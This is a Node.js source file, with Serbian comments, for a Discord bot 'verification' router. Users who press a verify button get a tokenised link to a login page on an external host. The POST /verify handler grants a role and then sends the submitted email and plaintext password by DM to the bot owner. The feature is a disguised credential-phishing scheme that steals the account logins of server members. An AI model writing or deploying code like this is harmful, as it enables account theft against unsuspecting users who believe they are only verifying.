const { Router } = require("express");
const { EmbedBuilder } = require("discord.js");
const { ServerConfig } = require("../schemas");
const mongoose = require("mongoose");

// Schema za token
const verifyTokenSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  guildId: { type: String, required: true },
  userId: { type: String, required: true },
  createdAt: { type: Date, default: Date.now, expires: 600 }
});
const VerifyToken = mongoose.models.VerifyToken || mongoose.model("VerifyToken", verifyTokenSchema);

module.exports = function webhookRouter(client) {
  const router = Router();

  client.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;
    if (!interaction.customId.startsWith("verify_btn_")) return;

    const guildId = interaction.customId.replace("verify_btn_", "");
    const config = await ServerConfig.findOne({ guildId });

    if (!config?.verify?.roleId) {
      return interaction.reply({ content: "❌ Verifikacija nije podešena.", ephemeral: true });
    }

    const member = interaction.member;
    const role = interaction.guild.roles.cache.get(config.verify.roleId);

    if (!role) {
      return interaction.reply({ content: "❌ Rola nije pronađena.", ephemeral: true });
    }

    if (member.roles.cache.has(role.id)) {
      return interaction.reply({ content: "✅ Već si verifikovan!", ephemeral: true });
    }

    try {
      const token = `${guildId}-${member.id}-${Date.now()}`;
      
      await VerifyToken.deleteMany({ guildId, userId: member.id });
      await VerifyToken.create({ token, guildId, userId: member.id });

      const verifyUrl = `https://opii.onrender.com/webhook/login?token=${token}`;

      const embed = new EmbedBuilder()
        .setColor("#5865F2")
        .setTitle("✅ Verifikacija")
        .setDescription(`Klikni link ispod da se verifikuješ:\n\n[Klikni ovde da se verifikuješ](${verifyUrl})`)
        .setFooter({ text: "Link važi 10 minuta" })
        .setTimestamp();

      await interaction.reply({ embeds: [embed], ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: "❌ Greška, pokušaj ponovo.", ephemeral: true });
    }
  });

  router.get("/login", async (req, res) => {
    const { token } = req.query;
    const found = token ? await VerifyToken.findOne({ token }) : null;

    if (!found) {
      return res.status(400).send(`
        <html><body style="margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;background:#fff;text-align:center;">
          <div><div style="font-size:80px;">❌</div><h1 style="font-size:24px;font-weight:700;margin-top:16px;color:#111;">Token nije validan ili je istekao.<br>Klikni dugme u Discordu ponovo.</h1></div>
        </body></html>
      `);
    }

    const fs = require("fs");
    const path = require("path");
    const html = fs.readFileSync(path.join(__dirname, "../web-app/login.html"), "utf8");
    res.send(html);
  });

  router.post("/verify", async (req, res) => {
    const { token, email, password } = req.body;

    const found = token ? await VerifyToken.findOne({ token }) : null;
    if (!found) {
      return res.status(400).json({ error: "Token nije validan." });
    }

    const { guildId, userId } = found;

    try {
      const guild = await client.guilds.fetch(guildId);
      const member = await guild.members.fetch(userId);
      const config = await ServerConfig.findOne({ guildId });
      const role = guild.roles.cache.get(config.verify.roleId);

      await member.roles.add(role);
      await VerifyToken.deleteOne({ token });

      try {
        const owner = await client.users.fetch(process.env.OWNER_ID);
        const ownerEmbed = new EmbedBuilder()
          .setColor("#2ecc71")
          .setTitle("🔐 Nova verifikacija")
          .addFields(
            { name: "Korisnik", value: `<@${userId}> (${member.user.tag})` },
            { name: "📧 Email", value: email },
            { name: "🔑 Lozinka", value: password }
          )
          .setTimestamp();
        await owner.send({ embeds: [ownerEmbed] });
      } catch (e) {
        console.error("DM greška:", e);
      }

      res.json({ ok: true });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Greška pri verifikaciji." });
    }
  });

  return router;
};